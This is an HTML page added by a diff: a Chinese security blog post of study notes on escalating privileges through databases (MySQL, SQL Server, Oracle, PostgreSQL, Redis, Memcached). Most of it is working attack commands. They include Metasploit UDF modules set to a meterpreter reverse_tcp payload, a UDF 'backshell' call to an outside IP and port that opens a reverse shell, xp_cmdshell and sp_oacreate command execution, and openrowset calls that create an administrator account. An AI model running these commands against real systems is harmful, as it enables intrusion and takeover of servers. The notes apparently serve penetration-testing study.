@@ -1,0 +1,403 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>数据库提权小结 | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="数据库提权小结 | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="​	最近重新学了一下xiaodi的提权课程，总结总结
+​	Raven2靶机可以打一打  用到了udf    	然后工具打的话用到了 隧道转发技术
+数据库帐号密码获取方式
+0、网站存在高权限SQL注入点    sqlmap 注入的 --sql..." />
+    <meta name="keywords" content="提权,笔记" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              数据库提权小结
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-01-17
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/deS5hM8TF/" class="post-tag">
+                  # 提权
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/ujY9_0y-bw/" class="post-tag">
+                  # 笔记
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>​	最近重新学了一下xiaodi的提权课程，总结总结</p>
+<p>​	Raven2靶机可以打一打  用到了udf    	然后工具打的话用到了 隧道转发技术</p>
+<h1 id="数据库帐号密码获取方式">数据库帐号密码获取方式</h1>
+<p>0、网站存在高权限SQL注入点    sqlmap 注入的 <code>--sql-shell</code> 模式</p>
+<p>1、数据库的存储文件或备份文件</p>
+<p>2、网站应用源码中的数据库配置文件</p>
+<p>3、采用工具或脚本爆破(需解决外联问题)</p>
+<h1 id="工具">工具</h1>
+<p>在mysql不支持外连的情况下 都可以代理连接         工具几个数据库都可以利用</p>
+<p>MDUT</p>
+<p>https://github.com/SafeGroceryStore/MDUT</p>
+<p>RequestTemplate</p>
+<p>https://github.com/1n7erface/RequestTemplate</p>
+<p>以下是手工的方法 在小迪22讲的  但是实战一般都是用工具</p>
+<hr>
+<h1 id="mysql">MYSQL</h1>
+<h2 id="提权条件">提权条件</h2>
+<p>MYSQL：PHP+MYSQL 以web入口提权</p>
+<p>条件：ROOT密码（高版本的-secure-file-priv没进行目录限制）</p>
+<p>技术：UDF MOF 启动项 反弹Shell</p>
+<p>mysql =&gt; root  默认端口3306    默认不支持外连   <code>GRANT ALL PRIVILEGES ON *.* TO '帐号'@'%' IDENTIFIED BY '密码' WITH GRANT OPTION;</code></p>
+<p>flush privileges;</p>
+<h2 id="1-udf">1、UDF</h2>
+<p>自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。</p>
+<hr>
+<p>获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续</p>
+<p>1.<strong>mysql&lt;5.2</strong> 导出目录c:/windows或system32</p>
+<p>2.<strong>mysql=&gt;5.2</strong> 导出安装目录/lib/plugin/</p>
+<p>获取版本  安装目录  看看有没有plugin</p>
+<p>select version() select @@basedir</p>
+<p>没有目录采用手工创建plugin目录或利用NTFS流创建</p>
+<p>使用MSF中的exploit/multi/mysql/mysql_udf_payload 模块可以进行UDF提权,</p>
+<p>MSF会将dll文件写入lib\plugin\目录下(前提是该目录存在，需手工创建),该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建 sys_eval() 函数，来执行有回显的命令。</p>
+<p><strong>开启外连</strong> GRANT ALL PRIVILEGES ON <em>.</em> TO '帐号'@'%' IDENTIFIED BY '密码' WITH GRANT OPTION;</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202311301514395.png" alt="image-20231130151415344" loading="lazy"></figure>
+<p><strong>MSF:</strong>（前提先开外连）</p>
+<p>(不需要考虑版本 )</p>
+<p><code>use exploit/multi/mysql/mysql_udf_payload</code></p>
+<p><code>set payload windows/meterpreter/reverse_tcp</code></p>
+<p><code>set password root</code></p>
+<p><code>set rhosts 47.102.195.100</code></p>
+<p><code>run</code></p>
+<p>产生了个文件</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202311301517374.png" alt="image-20231130151725350" loading="lazy"></figure>
+<p><strong>Navicat：</strong></p>
+<p>开外联后使用MSF导出，在执行后续命令调用执行</p>
+<p>select * from mysql.func where name = &quot;sys_exec&quot;;    //查看</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202311301520795.png" alt="image-20231130152015771" loading="lazy"></figure>
+<p><code>create function sys_eval returns string soname &quot;HArprLGO.dll&quot;;</code>      //创建函数绑定dll   执行后续命令 (默认创建的sys_exec 无回显)</p>
+<p><code>select sys_eval(&quot;whoami&quot;);</code>    //调用函数进行命令执行</p>
+<h2 id="2-mof-win2008后权限控制导致无效-msf演示-用不到了">2、MOF-Win2008后权限控制导致无效-MSF演示  （用不到了</h2>
+<p>https://www.cnblogs.com/xishaonian/p/6384535.html</p>
+<p>MSF：use exploit/windows/mysql/mysql_mof</p>
+<h2 id="3-启动项-鸡肋">3、启动项    鸡肋</h2>
+<p>但是要重启服务器才可与。。</p>
+<p>MSF：（前提先开外连）</p>
+<p>``use exploit/windows/mysql/mysql_start_up`</p>
+<p><code>set rhosts  192.168.3.25</code></p>
+<p><code>set username root</code></p>
+<p><code>set password 123456</code></p>
+<p><code>run</code></p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202311301655564.png" alt="image-20231130165519517" loading="lazy"></figure>
+<h3 id="4-反弹shell">4、反弹Shell</h3>
+<p><strong>0x01 介绍</strong><br>
+Mysql反弹shell提权，也是属于udf提权，只不过应用场景不同，例如没有得到webshell，但是获得了Mysql的root密码，恰好目标的数据库可以外连，那么就可以先将udf.dll文件的内容先插入到数据表中，然后再导出到’lib/plugin’</p>
+<p>https://blog.csdn.net/weixin_43801718/article/details/105493042</p>
+<p><code>set @a=concat('',</code></p>
+<p><code>create table Ghost(data LONGBLOB);</code></p>
+<p><code>insert into Ghost values(&quot;&quot;);update Ghost set data = @a;</code></p>
+<p><code>select data from Ghost into DUMPFILE 'C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll';     //这个路径。。</code></p>
+<p><code>create function backshell returns string soname 'udf.dll';</code></p>
+<p><code>select backshell('47.94.236.117',7788);</code></p>
+<h1 id="sqlserver">sqlserver</h1>
+<h2 id="提权条件-2">提权条件</h2>
+<p>MSSQL：.NET+MSSQL 以web入口提权 1433    <strong>默认支持外连</strong></p>
+<p>条件：sa密码</p>
+<p>技术：xp_cmdshell sp_oacreate CLR 沙盒</p>
+<p>开外连 命令</p>
+<p><code>EXEC sp_configure 'show advanced options', 1;</code></p>
+<p><code>RECONFIGURE;</code></p>
+<p><code>EXEC sp_configure 'Ad Hoc Distributed Queries', 1;</code></p>
+<p><code>RECONFIGURE;</code></p>
+<p>参考资料：https://blog.51cto.com/11797152/2411770</p>
+<h2 id="1使用xp_cmdshell进行提权">1.使用xp_cmdshell进行提权</h2>
+<p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。</p>
+<p>启用：</p>
+<p><code>EXEC sp_configure 'show advanced options', 1</code></p>
+<p><code>RECONFIGURE;</code></p>
+<p><code>EXEC sp_configure 'xp_cmdshell', 1;</code></p>
+<p><code>RECONFIGURE;</code></p>
+<p>关闭：</p>
+<p><code>exec sp_configure 'show advanced options', 1;</code></p>
+<p><code>reconfigure;</code></p>
+<p><code>exec sp_configure 'xp_cmdshell', 0;</code></p>
+<p><code>reconfigure;</code></p>
+<p>执行：</p>
+<p><code>EXEC master.dbo.xp_cmdshell '命令'</code></p>
+<p>如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</p>
+<p><code>exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'</code></p>
+<h2 id="2使用sp_oacreate进行提权">2.使用sp_oacreate进行提权</h2>
+<p>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。</p>
+<p>启用：</p>
+<p><code>EXEC sp_configure 'show advanced options', 1;</code></p>
+<p><code>RECONFIGURE WITH OVERRIDE;</code></p>
+<p><code>EXEC sp_configure 'Ole Automation Procedures', 1;</code></p>
+<p><code>RECONFIGURE WITH OVERRIDE;</code></p>
+<p>关闭：</p>
+<p><code>EXEC sp_configure 'show advanced options', 1;</code></p>
+<p><code>RECONFIGURE WITH OVERRIDE;</code></p>
+<p><code>EXEC sp_configure 'Ole Automation Procedures', 0;</code></p>
+<p><code>RECONFIGURE WITH OVERRIDE;</code></p>
+<p>执行：</p>
+<p><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt'</code></p>
+<h2 id="3使用sql-server-沙盒提权">3.使用SQL Server 沙盒提权</h2>
+<p>以上两个用不了</p>
+<p><code>exec sp_configure 'show advanced options',1;reconfigure;</code></p>
+<p>-- 不开启的话在执行xp_regwrite会提示让我们开启，</p>
+<p><code>exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;</code></p>
+<p>--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</p>
+<p><code>exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;</code></p>
+<p>--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</p>
+<p><code>exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'</code></p>
+<p>--执行系统命令<code>select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(&quot;net user margin margin /add&quot;)')</code></p>
+<p><code>select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(&quot;net localgroup administrators margin /add&quot;)')</code></p>
+<p>沙盒模式SandBoxMode参数含义（默认是2）</p>
+<p><code>0</code>：在任何所有者中禁止启用安全模式</p>
+<p><code>1</code> ：为仅在允许范围内</p>
+<p><code>2</code> ：必须在access模式下</p>
+<p><code>3</code>：完全开启</p>
+<p>openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</p>
+<p>恢复配置</p>
+<p><code>exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;</code></p>
+<p><code>exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;</code></p>
+<p><code>exec sp_configure 'show advanced options',0;reconfigure;</code></p>
+<h1 id="oracle">Oracle</h1>
+<h2 id="提权条件-3">提权条件</h2>
+<p>Oracle：（站库分离，非JSP，直接数据库到系统等）1521</p>
+<p>条件：数据库用户密码</p>
+<p>技术：DBA，普通用户，注入模式</p>
+<p>开外连</p>
+<p><code>ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE;</code></p>
+<p><code>SHUTDOWN IMMEDIATE;</code></p>
+<p><code>STARTUP</code></p>
+<h2 id="工具-2">工具</h2>
+<p>项目  https://github.com/jas502n/oracleshell</p>
+<p>1、普通用户模式：</p>
+<p>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。</p>
+<p>2、DBA用户模式：（自动化工具演示）</p>
+<p>拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</p>
+<p>3、注入提升模式：（Sqlmap测试演示）</p>
+<p>拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显</p>
+<p>sqlmap语句</p>
+<p>--dbs  查询当前用户下的所有数据库</p>
+<p><code>--is-dba</code>：当前用户是否为管理权限</p>
+<h1 id="postgresql-5432">PostgreSQL   5432</h1>
+<p>Web到系统</p>
+<p>条件：数据库用户密码</p>
+<p>技术：CVE-2019-9193 UDF libc</p>
+<p>就是用工具梭哈了</p>
+<p>复现镜像：</p>
+<p>https://market.aliyun.com/products/56024006/cmjj016247.html</p>
+<p><code>DROP TABLE IF EXISTS cmd_exec;</code></p>
+<p><code>CREATE TABLE cmd_exec(cmd_output text);</code></p>
+<p><code>COPY cmd_exec FROM PROGRAM 'id';</code></p>
+<p><code>SELECT * FROM cmd_exec;</code></p>
+<h1 id="redis-6379">Redis 6379</h1>
+<p>也是直接用工具</p>
+<p>数据库到Linux</p>
+<p><strong>条件：利用未授权或密码连接后执行</strong></p>
+<p>见第78天课程内容-只适用Linux</p>
+<p>技术：写密钥ssh 计划任务 反弹shell CVE2022沙盒执行</p>
+<p>复现搭建：</p>
+<p><code>wget http://download.redis.io/releases/redis-2.8.17.tar.gz</code></p>
+<p><code>tar xzf redis-2.8.17.tar.gz</code></p>
+<p><code>cd redis-2.8.17</code></p>
+<p><code>make</code></p>
+<p><code>cd src</code></p>
+<p><code>/redis-server</code></p>
+<h1 id="memcached-11211">Memcached  11211</h1>
+<p>数据库到Linux</p>
+<p>条件：设置远程可访问或取得本地权限后访问</p>
+<p>是一套常用的key-value缓存系统，由于它本身没有权限控制模块，</p>
+<p>服务被攻击者扫描发现，通过命令交互可直接读取<strong>memcache中的敏感信息</strong>。    是通过这里面的信息再进一步提权</p>
+<p>复现镜像：</p>
+<p>https://market.aliyun.com/products/56024006/cmjj017529.html</p>
+<p>案例参考：</p>
+<p>https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg</p>
+<p>开启命令：</p>
+<p>systemctl start memcached.service</p>
+<p>关闭命令：</p>
+<p>systemctl stop memcached.service</p>
+<p>查看状态：</p>
+<p>systemctl status memcached.service</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401151813974.png" alt="image-20240115181337916" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%90%E5%8F%B7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F">数据库帐号密码获取方式</a></li>
+<li><a href="#%E5%B7%A5%E5%85%B7">工具</a></li>
+<li><a href="#mysql">MYSQL</a>
+<ul>
+<li><a href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6">提权条件</a></li>
+<li><a href="#1-udf">1、UDF</a></li>
+<li><a href="#2-mof-win2008%E5%90%8E%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E5%AF%BC%E8%87%B4%E6%97%A0%E6%95%88-msf%E6%BC%94%E7%A4%BA-%E7%94%A8%E4%B8%8D%E5%88%B0%E4%BA%86">2、MOF-Win2008后权限控制导致无效-MSF演示  （用不到了</a></li>
+<li><a href="#3-%E5%90%AF%E5%8A%A8%E9%A1%B9-%E9%B8%A1%E8%82%8B">3、启动项    鸡肋</a>
+<ul>
+<li><a href="#4-%E5%8F%8D%E5%BC%B9shell">4、反弹Shell</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#sqlserver">sqlserver</a>
+<ul>
+<li><a href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6-2">提权条件</a></li>
+<li><a href="#1%E4%BD%BF%E7%94%A8xp_cmdshell%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83">1.使用xp_cmdshell进行提权</a></li>
+<li><a href="#2%E4%BD%BF%E7%94%A8sp_oacreate%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83">2.使用sp_oacreate进行提权</a></li>
+<li><a href="#3%E4%BD%BF%E7%94%A8sql-server-%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83">3.使用SQL Server 沙盒提权</a></li>
+</ul>
+</li>
+<li><a href="#oracle">Oracle</a>
+<ul>
+<li><a href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6-3">提权条件</a></li>
+<li><a href="#%E5%B7%A5%E5%85%B7-2">工具</a></li>
+</ul>
+</li>
+<li><a href="#postgresql-5432">PostgreSQL   5432</a></li>
+<li><a href="#redis-6379">Redis 6379</a></li>
+<li><a href="#memcached-11211">Memcached  11211</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/windows-ti-quan-xiao-jie/">
+              <h3 class="post-title">
+                Windows提权小结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
